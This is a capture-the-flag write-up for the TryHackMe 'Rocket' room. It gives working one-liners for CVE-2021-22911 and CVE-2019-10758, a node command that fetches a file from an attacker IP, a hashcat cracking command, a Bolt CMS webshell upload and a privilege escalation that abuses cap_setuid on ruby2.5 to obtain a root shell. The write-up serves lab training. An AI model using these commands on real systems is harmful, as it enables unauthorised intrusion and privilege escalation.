# Rocket

https://tryhackme.com/room/rocket

Rated: HARD

This room is a quest, and has many steps before you find the first flag. In fact, the two flags are the final steps of this room, after a lot of work haha.

1. A scan reveals port 22 and 80. On 80 you are redirected to 'rocket.thm', which is a brochureware site. A bit of investigation reveals this to be built with Bolt CMS, which becomes important (much) later.
2. Enumerating sub-domains using ffuf, you can quickly find 'chat.rocket.thm', running an instance of rocket chat. There are a few CVEs for this, in particular CVE-2021-22911 which allows using a nosql injection to recover a password reset token. There is an exploit for this here https://www.exploit-db.com/exploits/49960, however it is slow as hell and requires a few modifications (removing assumed MFA, and changing the final payload to actually work) so instead I buildt my own here in rust: https://github.com/ChrisPritchard/CVE-2021-22911-rust. This just requires you update the IP address and then it will give you after *much less* time a limited interactive shell.
3. From there, in a docker container, getting a better shell can be tricky as there are no download tools. You can use rocketchat itself (with your new admin login) to upload files, but you can also do with a simple node one liner: `node -e 'require("http").get("http://10.10.16.78:1234/client", res => res.pipe(require("fs").createWriteStream("client")))'`. If this is tricky to get running through the shell, base64 encode it and decode it on the machine before running.
4. Enumerating the machine, you can find details of mongodb in the environment variables. If you create a pivot through the docker container (e.g. using chisel or reverse_ssh) you can access mongodb directly via a cli without creds, but there is nothing inside. Instead, the web interface on 172.17.0.4:8081 is interesting: while it requires creds to access, you can fingerprint it by it returning express in one of the response headers and its port 8081, plus being a mongodb web interface: this is mongo-express. 
5. There is an outstanding CVE for this, CVE-2019-10758. You don't need a custom tool for it, a simple one liner with curl from the attack box through proxychains will work: `proxychains curl 'http://172.17.0.4:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw=='  --data 'document=this.constructor.constructor("return pr")().mainModule.require("child_process").execSync("id")'`. This will return 'valid' if the command succeeds, which is helpful.
6. Using the above to get a shell on 172.17.0.4, its another locked down docker container. Enumerating it you can find a backups folder, `/backup/db_backup/meteor`. In here is a mongodb backup, but whats interesting is a file named `bson.hash` which contains a username:passwordhash combo. This can be cracked with hashcat or john the ripper - if using hashcat, make sure to include the username in the hash as its presented, then run hashcat with the --username flag (e.g. `hashcat.exe -m 3200 ../hash ../rockyou.txt --username` which will use the username as part of the bcrypt algorithm. this should break in seconds.
7. Back to the initial rocket.thm site, navigating to `/bolt` will reveal a login portal. Use the username in email form, e.g. user@rocket.thm as the username, and the password cracked above to get access to the bolt admin interface.
8. There are plenty of ways to get RCE from here - the simplest to me was to edit main configuration and add pgp to the allowed_media_types. After that, just upload a webshell using file management.
9. This gets you access as 'alvin' and *finally* the first flag.

The final root exploit is a little tricky.

To get to root, a simple enum will quickly reveal `/usr/bin/ruby2.5` has the cap_setuid capability. However, the machine is also running apparmor which restricts what files ruby2.5 can access (as seen in `/etc/apparmor.d/usr.bin/ruby2.5`). Namely, no shells, nothing you can own except files named `/tmp/.X[number]-lock`

Because you can't run a shell, or execute those tmp lock files, the path is a bit complex: instead of trying to run a shell, copy a shell into tmp with this allowed file name as your normal user, mark it as a suid binary, then use ruby2.5 to copy it as the root user while preserving its mode, creating a root-owned suid bash binary you can then run as alvin.

This is complicated initially by the fact that the setuid capability or how apparmor works makes this fail using anything but a *proper* proper shell. To get one, I added my public key into a .ssh/authorized_keys file for alvin, then ssh'd in formally. This seems to resolve EPERM issues running `Process::Sys.setuid(0)`.

Finally, after copying `/bin/bash` to `/tmp/.X1-lock`, I copied it with `ruby2.5 -e 'Process::Sys.setuid(0); exec "cp --preserve=mode /tmp/.X1-lock /tmp/.X2-lock"'`. I could then run `/tmp/.X2-lock -p` to get a full root shell and the final flag.

A complex room! Took me a loooooong time over many attempts, the occasional hints from walkthroughs to get here.
